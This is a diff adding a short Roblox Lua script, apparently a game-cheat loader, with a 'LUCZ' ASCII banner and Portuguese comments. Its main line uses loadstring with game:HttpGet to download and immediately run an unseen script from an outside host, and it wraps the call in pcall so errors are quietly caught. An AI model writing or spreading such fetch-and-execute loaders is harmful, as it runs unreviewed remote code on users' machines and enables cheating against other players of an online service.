@@ -1,0 +1,42 @@
+-- Banner ASCII
+local banner = [[
+ ██▓     █    ██  ▄████▄  ▒███████▒
+▓██▒     ██  ▓██▒▒██▀ ▀█  ▒ ▒ ▒ ▄▀░
+▒██░    ▓██  ▒██░▒▓█    ▄ ░ ▒ ▄▀▒░ 
+▒██░    ▓▓█  ░██░▒▓▓▄ ▄██▒  ▄▀▒   ░
+░██████▒▒▒█████▓ ▒ ▓███▀ ░▒███████▒
+░ ▒░▓  ░░▒▓▒ ▒ ▒ ░ ░▒ ▒  ░░▒▒ ▓░▒░▒
+░ ░ ▒  ░░░▒░ ░ ░   ░  ▒   ░░▒ ▒ ░ ▒
+  ░ ░    ░░░ ░ ░ ░        ░ ░ ░ ░ ░
+    ░  ░   ░     ░ ░        ░ ░    
+                 ░        ░        
+]]
+print(banner)
+
+-- Otimização de execução
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Workspace = workspace
+local Camera = Workspace.CurrentCamera
+
+local Heartbeat = RunService.Heartbeat
+local GetPlayerFromCharacter = Players.GetPlayerFromCharacter
+
+local function OptimizedLoop(func)
+    return Heartbeat:Connect(function(deltaTime)
+        local ok, err = pcall(func, deltaTime)
+        if not ok then
+            warn("Erro no loop otimizado:", err)
+        end
+    end)
+end
+
+-- Executar script externo com proteção
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://api.junkie-development.de/api/v1/luascripts/public/94e0c317d482f4e861f93d3cd2c812456e5d0d1843638831b5acd4fc6b568a7b/download"))()
+end)
+
+if not success then
+    warn("Falha ao executar o script externo:", err)
+end
